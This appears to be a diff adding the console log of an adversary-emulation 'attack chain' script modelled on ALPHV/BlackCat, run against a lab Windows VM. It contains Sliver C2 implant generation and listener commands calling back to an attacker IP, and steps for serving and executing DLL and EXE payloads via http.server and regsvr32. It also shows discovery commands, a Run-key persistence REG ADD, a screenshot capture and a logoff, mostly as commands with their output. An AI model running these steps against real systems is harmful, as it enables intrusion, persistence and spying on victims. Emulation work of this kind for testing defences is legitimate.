@@ -1,0 +1,597 @@
+└─$ python 3_ALPHVBlackcat_attack_chain.py
+/home/kali/Aurora-demos/attacks_windows_0218/3_ALPHVBlackcat/output/3_ALPHVBlackcat_attack_chain.py:725: SyntaxWarning: invalid escape sequence '\S'
+  """
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build DLL Sliver implant
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 6666
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: True): sliver_save
+[MANUAL ACTION REQUIRED]
+    sliver > generate --mtls 192.168.56.101:6666 --os windows --arch 64bit --format shared --save sliver_save
+    sliver > mtls --lport 6666
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\AESTHETIC_PACKET.dll
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the file on the attacker's machine
+    3. Download the file to C:\Users\victim\Downloads\AESTHETIC_PACKET.dll
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 3
+
+📌[Name] Simulate the victim execute a DLL file on its machine
+ Parameter Input
+  Parameter: DLL_PATH
+  Description: Saved path of the DLL file
+  ✓ Using stored value: C:\Users\victim\Downloads\AESTHETIC_PACKET.dll
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On victim's machine, use PowerShell or Command Prompt)
+    regsvr32 C:\Users\victim\Downloads\AESTHETIC_PACKET.dll
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 4
+
+📌[Name] Execute a Sliver Implant Payload
+
+📌[Sliver Executor] Step 5
+
+📌[Name] User Context Verification
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  Select from available Sliver sessions:
+Available Sessions:
+[0] d0c861a8-6a75-4f2b-83e5-6ba64544d452 - AESTHETIC_PACKET@WIN10-basic-tar (windows)
+Select session number: 0
+
+[Sliver Executor] Executing: whoami
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772848984935187790
+[All timestamps] [1772848984935187790]
+Exec Stdout: "win10-basic-tar\victim\r\n"
+Pid: 11720
+
+
+📌[Sliver Executor] Step 6
+
+📌[Name] Environment Variable Retrieval
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+ Parameter Input
+  Parameter: name
+  Description: Environment variable name to query
+➤ Enter value for name (default: , required: True): USERNAME
+
+[Sliver Executor] Executing: get_env
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772848991422659807
+[All timestamps] [1772848984935187790, 1772848991422659807]
+Environment variable: Variables {
+  Key: "USERNAME"
+  Value: "victim"
+}
+
+
+📌[Sliver Executor] Step 7
+
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: ParentExecutorID
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+
+📌[Command Prompt Executor] Step 8
+
+📌[Name] Enumerate all accounts (Domain)
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772848997970363612
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612]
+Executing: net user /domain
+Output:
+Status: 2
+Stdout: "The request will be processed at a domain controller for domain WORKGROUP.\r\n\r\n"
+Stderr: "System error 1355 has occurred.\r\n\r\nThe specified domain either does not exist or could not be contacted.\r\n\r\n"
+Pid: 9776
+
+
+Executing: net group /domain
+Output:
+Status: 2
+Stdout: "The request will be processed at a domain controller for domain WORKGROUP.\r\n\r\n"
+Stderr: "System error 1355 has occurred.\r\n\r\nThe specified domain either does not exist or could not be contacted.\r\n\r\n"
+Pid: 10052
+
+
+[FINISHED] Command completed!😊
+
+📌[Sliver Executor] Step 9
+
+📌[Name] Network Interface Discovery
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+
+[Sliver Executor] Executing: ifconfig
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849004270143931
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931]
+Network Interface Configuration: NetInterfaces {
+  Index: 14
+  Name: "以太网"
+  MAC: "08:00:27:53:dd:16"
+  IPAddresses: "fd00::b0df:2f5c:24dd:f07a/64"
+  IPAddresses: "fd00::1c0e:164e:e685:9cd6/128"
+  IPAddresses: "fe80::3a8c:b767:9c70:b21d/64"
+  IPAddresses: "10.0.2.15/24"
+}
+NetInterfaces {
+  Index: 7
+  Name: "以太网 2"
+  MAC: "08:00:27:49:b4:92"
+  IPAddresses: "fe80::eac3:82e1:9d2a:8df2/64"
+  IPAddresses: "192.168.56.102/24"
+}
+NetInterfaces {
+  Index: 1
+  Name: "Loopback Pseudo-Interface 1"
+  IPAddresses: "::1/128"
+  IPAddresses: "127.0.0.1/8"
+}
+
+
+📌[Sliver Executor] Step 10
+
+📌[Name] Registry Key Read Operation
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+ Parameter Input
+  Parameter: hive
+  Description: Registry hive (HKLM/HKCU/HKU)
+➤ Enter value for hive (default: , required: True): HKLM
+ Parameter Input
+  Parameter: reg_path
+  Description: Path to registry key
+➤ Enter value for reg_path (default: , required: True): SYSTEM\CurrentControlSet\Services\VSS
+ Parameter Input
+  Parameter: key
+  Description: Specific value name to read
+➤ Enter value for key (default: , required: True): Start
+ Parameter Input
+  Parameter: hostname
+  Description: Target hostname for remote registry access
+➤ Enter value for hostname (default: , required: True): WIN10-basic-tar
+
+[Sliver Executor] Executing: registry_read
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849239561944993
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993]
+Registry Read Value: Value: "0x00000003"
+Response {
+}
+
+
+📌[Sliver Executor] Step 11
+
+📌[Name] Get Current Working Directory
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+
+[Sliver Executor] Executing: pwd
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849247393193497
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993, 1772849247393193497]
+Current working directory: C:\Users\victim\Desktop\cmder
+
+📌[Sliver Executor] Step 12
+
+📌[Name] Remote Processes List
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+
+[Sliver Executor] Executing: ps
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849252311153482
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993, 1772849247393193497, 
+1772849252311153482]
+Listing processes on the remote system:
+PID: 0, Executable: [System Process]
+PID: 4, Executable: System
+PID: 124, Executable: Registry
+PID: 392, Executable: smss.exe
+PID: 496, Executable: csrss.exe
+PID: 584, Executable: wininit.exe
+PID: 592, Executable: csrss.exe
+PID: 684, Executable: winlogon.exe
+PID: 728, Executable: services.exe
+PID: 752, Executable: lsass.exe
+PID: 880, Executable: svchost.exe
+PID: 896, Executable: fontdrvhost.exe
+PID: 912, Executable: fontdrvhost.exe
+PID: 996, Executable: svchost.exe
+PID: 436, Executable: svchost.exe
+PID: 1036, Executable: svchost.exe
+PID: 1076, Executable: dwm.exe
+PID: 1108, Executable: svchost.exe
+PID: 1116, Executable: svchost.exe
+PID: 1240, Executable: svchost.exe
+PID: 1268, Executable: svchost.exe
+PID: 1360, Executable: svchost.exe
+PID: 1432, Executable: VBoxService.exe
+PID: 1464, Executable: svchost.exe
+PID: 1512, Executable: svchost.exe
+PID: 1616, Executable: svchost.exe
+PID: 1624, Executable: svchost.exe
+PID: 1640, Executable: svchost.exe
+PID: 1648, Executable: svchost.exe
+PID: 1772, Executable: Memory Compression
+PID: 1808, Executable: svchost.exe
+PID: 1852, Executable: svchost.exe
+PID: 1872, Executable: svchost.exe
+PID: 1920, Executable: svchost.exe
+PID: 1928, Executable: svchost.exe
+PID: 2124, Executable: svchost.exe
+PID: 2212, Executable: svchost.exe
+PID: 2268, Executable: svchost.exe
+PID: 2276, Executable: svchost.exe
+PID: 2284, Executable: svchost.exe
+PID: 2352, Executable: svchost.exe
+PID: 2460, Executable: svchost.exe
+PID: 2492, Executable: spoolsv.exe
+PID: 2556, Executable: svchost.exe
+PID: 2616, Executable: svchost.exe
+PID: 2704, Executable: svchost.exe
+PID: 2712, Executable: svchost.exe
+PID: 2776, Executable: svchost.exe
+PID: 2792, Executable: svchost.exe
+PID: 2804, Executable: svchost.exe
+PID: 2812, Executable: svchost.exe
+PID: 2820, Executable: svchost.exe
+PID: 2880, Executable: svchost.exe
+PID: 2904, Executable: svchost.exe
+PID: 2928, Executable: svchost.exe
+PID: 2936, Executable: svchost.exe
+PID: 3060, Executable: svchost.exe
+PID: 3068, Executable: svchost.exe
+PID: 3292, Executable: svchost.exe
+PID: 3604, Executable: svchost.exe
+PID: 3864, Executable: dllhost.exe
+PID: 4040, Executable: SearchIndexer.exe
+PID: 4072, Executable: svchost.exe
+PID: 4944, Executable: AggregatorHost.exe
+PID: 4404, Executable: svchost.exe
+PID: 4580, Executable: svchost.exe
+PID: 888, Executable: svchost.exe
+PID: 1144, Executable: svchost.exe
+PID: 1836, Executable: svchost.exe
+PID: 4316, Executable: svchost.exe
+PID: 4320, Executable: svchost.exe
+PID: 544, Executable: svchost.exe
+PID: 4960, Executable: svchost.exe
+PID: 1508, Executable: svchost.exe
+PID: 2312, Executable: svchost.exe
+PID: 2828, Executable: svchost.exe
+PID: 5908, Executable: svchost.exe
+PID: 6136, Executable: sihost.exe
+PID: 4884, Executable: svchost.exe
+PID: 3560, Executable: svchost.exe
+PID: 764, Executable: taskhostw.exe
+PID: 1820, Executable: svchost.exe
+PID: 1172, Executable: ctfmon.exe
+PID: 1380, Executable: explorer.exe
+PID: 4336, Executable: svchost.exe
+PID: 6488, Executable: svchost.exe
+PID: 6608, Executable: svchost.exe
+PID: 6948, Executable: dllhost.exe
+PID: 6792, Executable: svchost.exe
+PID: 6940, Executable: StartMenuExperienceHost.exe
+PID: 3676, Executable: RuntimeBroker.exe
+PID: 6440, Executable: SearchApp.exe
+PID: 7320, Executable: RuntimeBroker.exe
+PID: 8180, Executable: RuntimeBroker.exe
+PID: 8344, Executable: ShellExperienceHost.exe
+PID: 8432, Executable: RuntimeBroker.exe
+PID: 9112, Executable: TextInputHost.exe
+PID: 8888, Executable: SecurityHealthSystray.exe
+PID: 9072, Executable: SecurityHealthService.exe
+PID: 8820, Executable: VBoxTray.exe
+PID: 9988, Executable: svchost.exe
+PID: 10068, Executable: ApplicationFrameHost.exe
+PID: 9204, Executable: svchost.exe
+PID: 10464, Executable: svchost.exe
+PID: 10620, Executable: RuntimeBroker.exe
+PID: 5392, Executable: MoUsoCoreWorker.exe
+PID: 11716, Executable: WmiPrvSE.exe
+PID: 11848, Executable: smartscreen.exe
+PID: 11424, Executable: SearchApp.exe
+PID: 1212, Executable: audiodg.exe
+PID: 12244, Executable: msedge.exe
+PID: 8484, Executable: msedge.exe
+PID: 7544, Executable: msedge.exe
+PID: 11556, Executable: msedge.exe
+PID: 10940, Executable: msedge.exe
+PID: 9916, Executable: msedge.exe
+PID: 11868, Executable: taskhostw.exe
+PID: 10384, Executable: M365Copilot.exe
+PID: 11904, Executable: msedgewebview2.exe
+PID: 1668, Executable: msedgewebview2.exe
+PID: 5984, Executable: msedgewebview2.exe
+PID: 8084, Executable: msedgewebview2.exe
+PID: 7576, Executable: msedgewebview2.exe
+PID: 8904, Executable: msedgewebview2.exe
+PID: 8492, Executable: svchost.exe
+PID: 5812, Executable: svchost.exe
+PID: 804, Executable: MusNotifyIcon.exe
+PID: 4168, Executable: MpDefenderCoreService.exe
+PID: 11452, Executable: MsMpEng.exe
+PID: 1632, Executable: MicrosoftEdgeUpdate.exe
+PID: 6424, Executable: OneDrive.exe
+PID: 8124, Executable: OneDrive.Sync.Service.exe
+PID: 3700, Executable: taskhostw.exe
+PID: 10988, Executable: svchost.exe
+PID: 7120, Executable: UserOOBEBroker.exe
+PID: 9064, Executable: ETWData.exe
+PID: 9888, Executable: conhost.exe
+PID: 9368, Executable: msedge.exe
+PID: 10724, Executable: ConEmu64.exe
+PID: 10936, Executable: ConEmuC64.exe
+PID: 6540, Executable: conhost.exe
+PID: 13040, Executable: cmd.exe
+PID: 10560, Executable: regsvr32.exe
+PID: 12132, Executable: msedge.exe
+PID: 3080, Executable: svchost.exe
+PID: 5548, Executable: msedge.exe
+PID: 3672, Executable: provtool.exe
+PID: 11244, Executable: svchost.exe
+PID: 10364, Executable: taskhostw.exe
+PID: 12304, Executable: TrustedInstaller.exe
+PID: 3808, Executable: TiWorker.exe
+PID: 6536, Executable: ngentask.exe
+PID: 11132, Executable: sppsvc.exe
+PID: 6048, Executable: ngentask.exe
+PID: 10992, Executable: conhost.exe
+PID: 5988, Executable: conhost.exe
+PID: 8712, Executable: svchost.exe
+PID: 7092, Executable: ngen.exe
+PID: 9660, Executable: ngen.exe
+PID: 12668, Executable: svchost.exe
+PID: 8128, Executable: wuauclt.exe
+PID: 792, Executable: WinREUpdateInstaller_2601B_amd64.exe
+PID: 11152, Executable: WinREUpdateInstaller.exe
+PID: 9596, Executable: taskhostw.exe
+PID: 11932, Executable: svchost.exe
+PID: 3140, Executable: CompatTelRunner.exe
+PID: 10280, Executable: conhost.exe
+PID: 928, Executable: Defrag.exe
+PID: 10712, Executable: cleanmgr.exe
+PID: 9432, Executable: MpCmdRun.exe
+PID: 8644, Executable: MpCmdRun.exe
+PID: 7296, Executable: MpCmdRun.exe
+PID: 4232, Executable: MpCmdRun.exe
+PID: 1676, Executable: svchost.exe
+PID: 1004, Executable: conhost.exe
+PID: 4480, Executable: conhost.exe
+PID: 6892, Executable: conhost.exe
+PID: 4700, Executable: conhost.exe
+PID: 4788, Executable: conhost.exe
+PID: 6812, Executable: svchost.exe
+PID: 12392, Executable: svchost.exe
+PID: 2400, Executable: svchost.exe
+PID: 13308, Executable: CompatTelRunner.exe
+PID: 6652, Executable: ngentask.exe
+PID: 464, Executable: RuntimeBroker.exe
+PID: 6292, Executable: ngentask.exe
+PID: 12180, Executable: conhost.exe
+PID: 8532, Executable: svchost.exe
+PID: 9604, Executable: NisSrv.exe
+PID: 2256, Executable: conhost.exe
+PID: 6232, Executable: mcbuilder.exe
+PID: 4572, Executable: conhost.exe
+PID: 11580, Executable: WmiPrvSE.exe
+PID: 5212, Executable: DismHost.exe
+PID: 1136, Executable: mscorsvw.exe
+
+📌[Sliver Console] Step 13
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101\
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 8888
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: True): payload.exe
+[MANUAL ACTION REQUIRED]
+    sliver > generate --mtls 192.168.56.101\:8888 --os windows --arch 64bit --format exe --save payload.exe
+    sliver > mtls --lport 8888
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 14
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\VITAL_SQUASH.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the file on the attacker's machine
+    3. Download the file to C:\Users\victim\Downloads\VITAL_SQUASH.exe
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Command Prompt Executor] Step 15
+
+📌[Name] Reg Key Run
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+ Parameter Input
+  Parameter: command_to_execute
+  Description: Thing to Run
+  ✓ Using stored value: C:\Users\victim\Downloads\VITAL_SQUASH.exe
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849381315897272
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993, 1772849247393193497, 
+1772849252311153482, 1772849381315897272]
+Executing: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Users\victim\Downloads\VITAL_SQUASH.exe"
+Output:
+Status: 1
+Stderr: "ERROR: Invalid syntax.\r\nType "REG ADD /?" for usage.\r\n"
+Pid: 9116
+
+
+[FINISHED] Command completed!😊
+
+📌[None] Step 16
+
+📌[Name] Obtain a persistent Sliver Executor
+
+📌[Human] Step 17
+
+📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)
+ Parameter Input
+  Parameter: HOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for HOST (default: None, required: False): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: False): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): :\Users\victim\Downloads\VITAL_SQUASH.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the target payload file
+    3. Download the payload file
+    4. Execute the payload file to :\Users\victim\Downloads\VITAL_SQUASH.exe as Admin (Root)
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 18
+
+📌[Name] Execute a Sliver Implant Payload
+
+📌[Sliver Executor] Step 19
+
+📌[Name] Take Screenshot
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: d0c861a8-6a75-4f2b-83e5-6ba64544d452
+
+[Sliver Executor] Executing: screenshot
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849424192803351
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993, 1772849247393193497, 
+1772849252311153482, 1772849381315897272, 1772849424192803351]
+Screenshot saved to /home/kali/Downloads/screenshot_20260306200302.png
+
+📌[Sliver Executor] Step 20
+
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: ParentExecutorID
+  Description: The session ID of the active Sliver connection.
+  Select parent session for derived executor:
+Available Sessions:
+[0] d0c861a8-6a75-4f2b-83e5-6ba64544d452 - AESTHETIC_PACKET@WIN10-basic-tar (windows)
+[1] 1d9aea7e-0bbd-4d05-96d0-2c9cf1d6c384 - VITAL_SQUASH@WIN10-basic-tar (windows)
+Select session number: 1
+
+📌[Elevated Command Prompt Executor] Step 21
+
+📌[Name] Logoff System - Windows
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: 1d9aea7e-0bbd-4d05-96d0-2c9cf1d6c384
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772849431433720114
+[All timestamps] [1772848984935187790, 1772848991422659807, 1772848997970363612, 1772849004270143931, 1772849239561944993, 1772849247393193497, 
+1772849252311153482, 1772849381315897272, 1772849424192803351, 1772849431433720114]
+Executing: shutdown /l
+Output:
+Pid: 6180
+
+
+[FINISHED] Command completed!😊
